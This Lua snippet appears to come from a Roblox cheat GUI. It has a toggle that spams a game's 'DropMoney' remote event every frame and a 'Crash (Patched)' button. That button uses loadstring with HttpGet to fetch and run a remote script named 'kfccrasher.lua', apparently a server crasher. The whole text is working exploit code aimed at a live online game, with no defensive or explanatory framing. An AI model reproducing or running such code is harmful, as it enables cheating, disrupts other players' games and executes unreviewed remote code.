local Dropped = 0;
Cash:AddToggle({text = "Drop Cash", callback = function(v)
    if v then 
        Render = game:GetService("RunService").RenderStepped:Connect(function()
            local args = {[1] = "DropMoney",[2] = tostring(Dropped)}
            game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
        end)
    else
        Render:Disconnect()
    end
end})
Cash:AddSlider({text = 'Amount To Drop', min = 1, max = 10000, callback = function(v)
     print(v) 
     Dropped = v;
end})
Danger:AddButton({text = 'Crash (Patched)', callback = function() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/aaronsprojects/aaronsellers/main/kfccrasher.lua"))()
end})

